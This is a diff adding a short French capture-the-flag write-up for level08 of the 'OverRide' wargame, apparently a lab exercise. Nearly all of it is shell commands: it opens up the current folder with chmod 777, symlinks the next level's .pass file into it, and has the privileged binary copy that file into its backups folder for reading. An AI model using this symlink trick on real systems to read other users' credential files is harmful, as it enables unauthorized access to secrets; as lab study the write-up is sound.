@@ -1,0 +1,19 @@
+idee : creation d'un lien symbolique dans le dossier courant pour eviter la concatenation a l'execution du programme
+
+level08@OverRide:~$ ./level08 test 
+Usage: ./level08 filename
+ERROR: Failed to open test
+
+
+On voit que l’executable lit le fichier pris en argv[1] puis en ecrit son contenu dans un second fichier stocké dans backups. On cherche donc à lire le pass du level09. 
+Le lien symbolique ne peux etre creer uniquement dans le fichier courant. autre par il fera une concatenation avec './backups/'. Ex: ./backups//etc/passwd
+Il faut donc commencer par donner les droits sur le dossier courant.
+level08@OverRide:~$ chmod 777 .
+level08@OverRide:~$ ln -s /home/users/level09/.pass passwd
+level08@OverRide:~$ ls
+backups  level08  passwd
+level08@OverRide:~$ ./level08 passwd
+level08@OverRide:~$ cd backups/
+level08@OverRide:~/backups$ ls
+passwd
+level08@OverRide:~/backups$ cat passwd
